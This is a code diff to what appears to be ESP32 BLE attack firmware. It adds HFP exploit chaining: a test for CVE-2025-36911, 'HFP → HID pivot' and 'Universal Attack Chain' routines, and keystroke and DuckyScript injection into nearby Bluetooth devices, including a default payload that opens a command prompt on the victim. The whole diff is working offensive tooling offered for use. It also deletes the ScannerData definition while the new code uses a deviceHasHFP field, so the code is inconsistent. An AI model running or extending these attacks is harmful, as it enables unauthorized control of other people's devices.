@@ -7,6 +7,7 @@
 #include <esp_heap_caps.h>
 #include <SD.h>
 #include "modules/NRF24/nrf_jammer_api.h"
+#include "HFP_Exploit.h"
 
 extern tft_logger tft;
 extern BruceConfig bruceConfig;
@@ -14,68 +15,6 @@ extern volatile int tftWidth;
 extern volatile int tftHeight;
 
 String globalScript = "";
-
-struct ScannerData {
-    std::vector<String> deviceNames;
-    std::vector<String> deviceAddresses;
-    std::vector<int> deviceRssi;
-    std::vector<bool> deviceFastPair;
-    std::vector<uint8_t> deviceTypes;
-    SemaphoreHandle_t mutex;
-    int foundCount;
-
-    ScannerData() {
-        mutex = xSemaphoreCreateMutex();
-        foundCount = 0;
-    }
-
-    ~ScannerData() {
-        if(mutex) vSemaphoreDelete(mutex);
-    }
-
-    void addDevice(const String& name, const String& address, int rssi, bool fastPair, uint8_t type) {
-        if(xSemaphoreTake(mutex, portMAX_DELAY)) {
-            bool isDuplicate = false;
-            for(size_t i = 0; i < deviceAddresses.size(); i++) {
-                if(deviceAddresses[i] == address) {
-                    isDuplicate = true;
-                    deviceRssi[i] = rssi;
-                    break;
-                }
-            }
-            if(!isDuplicate) {
-                deviceNames.push_back(name);
-                deviceAddresses.push_back(address);
-                deviceRssi.push_back(rssi);
-                deviceFastPair.push_back(fastPair);
-                deviceTypes.push_back(type);
-                foundCount++;
-            }
-            xSemaphoreGive(mutex);
-        }
-    }
-
-    void clear() {
-        if(xSemaphoreTake(mutex, portMAX_DELAY)) {
-            deviceNames.clear();
-            deviceAddresses.clear();
-            deviceRssi.clear();
-            deviceFastPair.clear();
-            deviceTypes.clear();
-            foundCount = 0;
-            xSemaphoreGive(mutex);
-        }
-    }
-
-    size_t size() {
-        size_t result = 0;
-        if(xSemaphoreTake(mutex, portMAX_DELAY)) {
-            result = deviceAddresses.size();
-            xSemaphoreGive(mutex);
-        }
-        return result;
-    }
-};
 
 static ScannerData scannerData;
 
@@ -221,6 +160,28 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
         }
         NimBLEDevice::deleteClient(pClient);
     }
+    
+    bool hasHFP = false;
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    if(hasHFP) {
+        showAttackProgress("Trying HFP exploit connection...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        NimBLEClient* hfpClient = hfp.attemptHFPConnection(target);
+        if(hfpClient) {
+            connectionMethod = "HFP Exploit connection";
+            return hfpClient;
+        }
+    }
+    
     return nullptr;
 }
 
@@ -1579,6 +1540,34 @@ bool HIDDuckyService::sendGUIKey(NimBLERemoteCharacteristic* pChar, char key) {
 
 bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
     if(!duckyEngine.loadFromString(script)) return false;
+    
+    bool hasHFP = false;
+    String deviceName = "";
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    if(hasHFP && !deviceName.isEmpty()) {
+        showAttackProgress("Device has HFP, testing vulnerability...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        if(hfp.testCVE202536911(target)) {
+            showAttackProgress("HFP vulnerable! Establishing connection...", TFT_GREEN);
+            if(hfp.establishHFPConnection(target)) {
+                showAttackProgress("HFP connected, executing script...", TFT_BLUE);
+                return executeDuckyScript(target);
+            }
+        }
+        showAttackProgress("HFP failed, trying regular connection...", TFT_ORANGE);
+    }
+    
     return executeDuckyScript(target);
 }
 
@@ -2123,6 +2112,30 @@ std::vector<String> VulnerabilityScanner::getVulnerabilities() {
 bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
     if(!confirmAttack("Attempt HID keystroke injection?")) return false;
 
+    bool hasHFP = false;
+    String deviceName = "";
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    if(hasHFP && !deviceName.isEmpty()) {
+        showAttackProgress("Trying HFP exploit first...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        if(hfp.executeHFPAttackChain(target)) {
+            showAttackProgress("HFP successful! Proceeding to HID...", TFT_GREEN);
+        } else {
+            showAttackProgress("HFP failed, trying direct HID...", TFT_ORANGE);
+        }
+    }
+
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
@@ -2236,6 +2249,7 @@ bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const Strin
     if(sent3) anySent = true;
 
     pClient->disconnect();
+    NimBLEDevice::deleteClient(pClient);
     NimBLEDevice::deinit(true);
     delay(300);
 
@@ -2659,7 +2673,7 @@ void BleSuiteMenu() {
 }
 
 void showAttackMenuWithTarget(NimBLEAddress target) {
-    const int MAX_ATTACKS = 21;
+    const int MAX_ATTACKS = 25;
     const char* attackNames[] = {
         "FastPair Buffer Overflow",
         "Advanced Protocol Attack",
@@ -2681,7 +2695,11 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
         "Force HID Injection",
         "HID Connection Exploit",
         "Advanced Ducky Injection",
-        "HID Vulnerability Test"
+        "HID Vulnerability Test",
+        "HFP Vulnerability Test",
+        "HFP Attack Chain",
+        "HFP → HID Pivot Attack",
+        "Universal Attack Chain"
     };
 
     int selectedAttack = 0;
@@ -2803,10 +2821,45 @@ void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
         case 18: runHIDConnectionExploit(target); break;
         case 19: runAdvancedDuckyInjection(target); break;
         case 20: runHIDVulnerabilityTest(target); break;
+        case 21: runHFPVulnerabilityTest(target); break;
+        case 22: runHFPAttackChain(target); break;
+        case 23: runHFPHIDPivotAttack(target); break;
+        case 24: runUniversalAttack(target); break;
     }
 }
 
 void runWhisperPairAttack(NimBLEAddress target) {
+    bool hasHFP = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    if(hasHFP) {
+        showAttackProgress("Device has HFP, testing first...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        if(hfp.testCVE202536911(target)) {
+            int choice = showAdaptiveMessage("Device has vulnerable HFP", 
+                                            "Use HFP exploit first", 
+                                            "Direct FastPair attack", 
+                                            "Cancel", 
+                                            TFT_ORANGE, true, false);
+            
+            if(choice == 0) {
+                if(hfp.executeHFPAttackChain(target)) {
+                    showAttackProgress("HFP successful! Now trying FastPair...", TFT_GREEN);
+                }
+            }
+            if(choice == -1) return;
+        }
+    }
+    
     WhisperPairExploit exploit;
     exploit.execute(target);
 }
@@ -2954,6 +3007,48 @@ void runMediaCommandHijack(NimBLEAddress target) {
 }
 
 void runHIDInjection(NimBLEAddress target) {
+    String deviceName = "";
+    int rssi = -60;
+    bool hasHFP = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    if(hasHFP && deviceName.length() > 0) {
+        int choice = showAdaptiveMessage("Device has HFP service", 
+                                        "Try HFP pivot first", 
+                                        "Direct HID attack", 
+                                        "Cancel", 
+                                        TFT_YELLOW, true, false);
+        
+        if(choice == 0) {
+            HFPExploitEngine hfp;
+            if(hfp.executeHFPAttackChain(target)) {
+                showAttackProgress("HFP successful! Attempting HID...", TFT_GREEN);
+                HIDAttackServiceClass hidAttack;
+                if(hidAttack.injectKeystrokes(target)) {
+                    showAttackResult(true, "HFP → HID chain successful!");
+                } else {
+                    showAttackResult(false, "HFP worked but HID failed");
+                }
+                return;
+            } else {
+                showAttackProgress("HFP failed, trying direct HID...", TFT_ORANGE);
+                delay(500);
+            }
+        }
+        if(choice == -1) return;
+    }
+    
     HIDAttackServiceClass hidAttack;
     bool result = hidAttack.injectKeystrokes(target);
     if(result) showAttackResult(true, "HID keystrokes attempted!");
@@ -2961,12 +3056,50 @@ void runHIDInjection(NimBLEAddress target) {
 }
 
 void runDuckyScriptAttack(NimBLEAddress target) {
+    String deviceName = "";
+    int rssi = -60;
+    bool hasHFP = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
     String script = getScriptFromUser();
     if(script.isEmpty()) return;
+    
+    if(hasHFP && deviceName.length() > 0) {
+        int choice = showAdaptiveMessage("Device has HFP service", 
+                                        "HFP pivot first", 
+                                        "Direct injection", 
+                                        "Cancel", 
+                                        TFT_YELLOW, true, false);
+        
+        if(choice == 0) {
+            HFPExploitEngine hfp;
+            if(hfp.executeHFPAttackChain(target)) {
+                showAttackProgress("HFP successful! Injecting script...", TFT_GREEN);
+                HIDDuckyService duckyService;
+                if(duckyService.injectDuckyScript(target, script)) {
+                    showAttackResult(true, "HFP → DuckyScript successful!");
+                } else {
+                    showAttackResult(false, "HFP worked but script injection failed");
+                }
+                return;
+            }
+        }
+        if(choice == -1) return;
+    }
+    
     HIDDuckyService duckyService;
-    bool result = duckyService.injectDuckyScript(target, script);
-    if(result) showAttackResult(true, "Ducky script executed!");
-    else showAttackResult(false, "Ducky script failed");
+    duckyService.injectDuckyScript(target, script);
 }
 
 void runPINBruteForce(NimBLEAddress target) {
@@ -2985,11 +3118,53 @@ void runAdvertisingSpam(NimBLEAddress target) {
 }
 
 void runQuickTest(NimBLEAddress target) {
-    showAttackProgress("Quick testing...", TFT_WHITE);
+    showAttackProgress("Quick testing (HFP + FastPair)...", TFT_WHITE);
+    
+    bool hasHFP = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                hasHFP = scannerData.deviceHasHFP[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    std::vector<String> results;
+    
+    if(hasHFP) {
+        HFPExploitEngine hfp;
+        bool hfpVulnerable = hfp.testCVE202536911(target);
+        results.push_back("HFP (CVE-2025-36911): " + String(hfpVulnerable ? "VULNERABLE" : "SAFE"));
+    } else {
+        results.push_back("HFP: Not detected");
+    }
+    
     WhisperPairExploit exploit;
-    bool result = exploit.executeSilent(target);
-    if(result) showAttackResult(true, "VULNERABLE!");
-    else showAttackResult(false, "Patched/Safe");
+    bool fpVulnerable = exploit.executeSilent(target);
+    results.push_back("FastPair: " + String(fpVulnerable ? "VULNERABLE" : "SAFE"));
+    
+    std::vector<String> lines;
+    lines.push_back("QUICK VULNERABILITY TEST");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    
+    for(auto& result : results) {
+        lines.push_back(result);
+    }
+    
+    lines.push_back("");
+    lines.push_back("Test completed");
+    
+    if(hasHFP && results[0].indexOf("VULNERABLE") != -1) {
+        lines.push_back("Try HFP-based attacks first!");
+        showDeviceInfoScreen("VULNERABLE DEVICE", lines, TFT_ORANGE, TFT_BLACK);
+    } else if(fpVulnerable) {
+        showDeviceInfoScreen("VULNERABLE", lines, TFT_RED, TFT_WHITE);
+    } else {
+        showDeviceInfoScreen("SAFE", lines, TFT_GREEN, TFT_BLACK);
+    }
 }
 
 void runDeviceProfiling(NimBLEAddress target) {
@@ -3326,12 +3501,14 @@ void runForceHIDInjection(NimBLEAddress target) {
     String mac = deviceInfo.substring(0, colonPos);
     String name = "";
     int rssi = -60;
+    bool hasHFP = false;
 
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == mac) {
                 name = scannerData.deviceNames[i];
                 rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
                 break;
             }
         }
@@ -3340,6 +3517,25 @@ void runForceHIDInjection(NimBLEAddress target) {
 
     String script = getScriptFromUser();
     if(script.isEmpty()) return;
+    
+    if(hasHFP && !name.isEmpty()) {
+        showAttackProgress("Device has HFP, attempting pivot...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        if(hfp.executeHFPAttackChain(target)) {
+            showAttackProgress("HFP successful! Forcing script injection...", TFT_GREEN);
+            HIDDuckyService duckyService;
+            bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);
+            
+            if(result) {
+                showAttackResult(true, "HFP → Forced injection successful!");
+            } else {
+                showAttackResult(false, "HFP worked but forced injection failed");
+            }
+            return;
+        } else {
+            showAttackProgress("HFP failed, trying regular forced injection...", TFT_ORANGE);
+        }
+    }
 
     HIDDuckyService duckyService;
     bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);
@@ -3361,16 +3557,44 @@ void runHIDConnectionExploit(NimBLEAddress target) {
     String mac = deviceInfo.substring(0, colonPos);
     String name = "";
     int rssi = -60;
+    bool hasHFP = false;
 
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == mac) {
                 name = scannerData.deviceNames[i];
                 rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
                 break;
             }
         }
         xSemaphoreGive(scannerData.mutex);
+    }
+
+    if(hasHFP && !name.isEmpty()) {
+        int choice = showAdaptiveMessage("Device has HFP", 
+                                        "Test HFP vulnerability", 
+                                        "Test HID connection", 
+                                        "Cancel", 
+                                        TFT_YELLOW, true, false);
+        
+        if(choice == 0) {
+            HFPExploitEngine hfp;
+            bool hfpVulnerable = hfp.testCVE202536911(target);
+            
+            if(hfpVulnerable) {
+                std::vector<String> lines;
+                lines.push_back("HFP VULNERABILITY TEST");
+                lines.push_back("Device: " + name);
+                lines.push_back("HFP: POTENTIALLY VULNERABLE");
+                lines.push_back("");
+                lines.push_back("Device has HFP service with");
+                lines.push_back("possible access issues");
+                showDeviceInfoScreen("HFP WARNING", lines, TFT_ORANGE, TFT_BLACK);
+                return;
+            }
+        }
+        if(choice == -1) return;
     }
 
     HIDExploitEngine hidExploit;
@@ -3506,6 +3730,140 @@ void runHIDVulnerabilityTest(NimBLEAddress target) {
         showDeviceInfoScreen("VULNERABLE", lines, TFT_RED, TFT_WHITE);
     } else {
         showAttackResult(false, "Device not vulnerable to HID injection");
+    }
+}
+
+void runHFPVulnerabilityTest(NimBLEAddress target) {
+    if(!confirmAttack("Test HFP vulnerability (CVE-2025-36911)?")) return;
+    
+    HFPExploitEngine hfp;
+    bool vulnerable = hfp.testCVE202536911(target);
+    
+    std::vector<String> lines;
+    lines.push_back("HFP VULNERABILITY TEST");
+    lines.push_back("Target: " + String(target.toString().c_str()));
+    lines.push_back("CVE-2025-36911: " + String(vulnerable ? "POTENTIALLY VULNERABLE" : "LIKELY PATCHED"));
+    lines.push_back("");
+    
+    if(vulnerable) {
+        lines.push_back("Device has HFP service");
+        lines.push_back("and allowed attribute access");
+        lines.push_back("");
+        lines.push_back("May be vulnerable to");
+        lines.push_back("unauthorized pairing/mic access");
+        showDeviceInfoScreen("HFP WARNING", lines, TFT_ORANGE, TFT_BLACK);
+    } else {
+        lines.push_back("No HFP service found or");
+        lines.push_back("access was denied");
+        lines.push_back("");
+        lines.push_back("Device may be patched");
+        showDeviceInfoScreen("HFP TEST", lines, TFT_BLUE, TFT_WHITE);
+    }
+}
+
+void runHFPAttackChain(NimBLEAddress target) {
+    if(!confirmAttack("Execute full HFP attack chain?")) return;
+    
+    HFPExploitEngine hfp;
+    hfp.executeHFPAttackChain(target);
+}
+
+void runHFPHIDPivotAttack(NimBLEAddress target) {
+    if(!confirmAttack("Execute HFP → HID pivot attack?")) return;
+    
+    HFPExploitEngine hfp;
+    showAttackProgress("Testing HFP vulnerability...", TFT_WHITE);
+    
+    if(hfp.testCVE202536911(target)) {
+        showAttackProgress("Device vulnerable! Attempting HFP connection...", TFT_GREEN);
+        
+        if(hfp.establishHFPConnection(target)) {
+            showAttackProgress("HFP connected! Pivoting to HID...", TFT_CYAN);
+            
+            HIDAttackServiceClass hidAttack;
+            bool hidSuccess = hidAttack.injectKeystrokes(target);
+            
+            if(hidSuccess) {
+                showAttackProgress("HID access confirmed! Running DuckyScript...", TFT_BLUE);
+                HIDDuckyService ducky;
+                String defaultScript = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
+                bool scriptSuccess = ducky.injectDuckyScript(target, defaultScript);
+                
+                if(scriptSuccess) {
+                    showAttackResult(true, "HFP → HID → DuckyScript chain successful!");
+                } else {
+                    showAttackResult(true, "HFP → HID pivot worked but script failed");
+                }
+            } else {
+                showAttackResult(false, "HFP worked but HID pivot failed");
+            }
+        } else {
+            showAttackResult(false, "HFP test passed but connection failed");
+        }
+    } else {
+        showAttackResult(false, "Device not vulnerable to CVE-2025-36911");
+    }
+}
+
+void runUniversalAttack(NimBLEAddress target) {
+    if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
+    
+    String deviceName = "";
+    int rssi = -60;
+    bool hasHFP = false;
+    bool hasFastPair = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                hasFastPair = scannerData.deviceFastPair[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    std::vector<String> lines;
+    lines.push_back("UNIVERSAL ATTACK CHAIN");
+    lines.push_back("Device: " + deviceName);
+    lines.push_back("HFP: " + String(hasHFP ? "YES" : "NO"));
+    lines.push_back("FastPair: " + String(hasFastPair ? "YES" : "NO"));
+    
+    bool hfpSuccess = false;
+    bool fpSuccess = false;
+    bool hidSuccess = false;
+    
+    if(hasHFP) {
+        showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        hfpSuccess = hfp.executeHFPAttackChain(target);
+        lines.push_back("HFP Attack: " + String(hfpSuccess ? "SUCCESS" : "FAILED"));
+        
+        if(hfpSuccess) {
+            showAttackProgress("HFP success! Phase 2: HID injection...", TFT_GREEN);
+            HIDAttackServiceClass hidAttack;
+            hidSuccess = hidAttack.injectKeystrokes(target);
+            lines.push_back("HID Injection: " + String(hidSuccess ? "SUCCESS" : "FAILED"));
+        }
+    }
+    
+    if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
+        showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
+        WhisperPairExploit exploit;
+        fpSuccess = exploit.executeSilent(target);
+        lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
+    }
+    
+    lines.push_back("");
+    lines.push_back("Attack chain completed");
+    
+    if(hfpSuccess || fpSuccess || hidSuccess) {
+        showDeviceInfoScreen("ATTACK SUCCESS", lines, TFT_GREEN, TFT_BLACK);
+    } else {
+        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
     }
 }
 
@@ -3745,17 +4103,19 @@ String selectTargetFromScan(const char* title) {
         if(rssi == 0) rssi = -100;
 
         bool fastPair = false;
+        bool hasHFP = false;
         uint8_t deviceType = 0;
 
         if(device->haveServiceUUID()) {
             NimBLEUUID uuid = device->getServiceUUID();
             std::string uuidStr = uuid.toString();
             if(uuidStr.find("fe2c") != std::string::npos) fastPair = true;
+            if(uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos) hasHFP = true;
             if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) deviceType |= 0x01;
             if(uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
         }
 
-        scannerData.addDevice(name, address, rssi, fastPair, deviceType);
+        scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
     }
 
     pBLEScan->stop();
@@ -3780,6 +4140,7 @@ String selectTargetFromScan(const char* title) {
                     scannerData.deviceFastPair[i] = scannerData.deviceFastPair[j];
                     scannerData.deviceFastPair[j] = tempFastPair;
 
+                    std::swap(scannerData.deviceHasHFP[i], scannerData.deviceHasHFP[j]);
                     std::swap(scannerData.deviceTypes[i], scannerData.deviceTypes[j]);
                 }
             }
@@ -3815,6 +4176,7 @@ String selectTargetFromScan(const char* title) {
             String address;
             int rssi = 0;
             bool fastPair = false;
+            bool hasHFP = false;
             uint8_t deviceType = 0;
 
             if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
@@ -3824,6 +4186,7 @@ String selectTargetFromScan(const char* title) {
                     address = scannerData.deviceAddresses[deviceIndex];
                     rssi = scannerData.deviceRssi[deviceIndex];
                     fastPair = scannerData.deviceFastPair[deviceIndex];
+                    hasHFP = scannerData.deviceHasHFP[deviceIndex];
                     deviceType = scannerData.deviceTypes[deviceIndex];
                 }
                 xSemaphoreGive(scannerData.mutex);
@@ -3835,6 +4198,7 @@ String selectTargetFromScan(const char* title) {
             if(displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
             displayText += " (" + String(rssi) + "dB)";
             if(fastPair) displayText += " [FP]";
+            if(hasHFP) displayText += " [HFP]";
             if(deviceType & 0x01) displayText += " [AUDIO]";
             if(deviceType & 0x02) displayText += " [HID]";
 
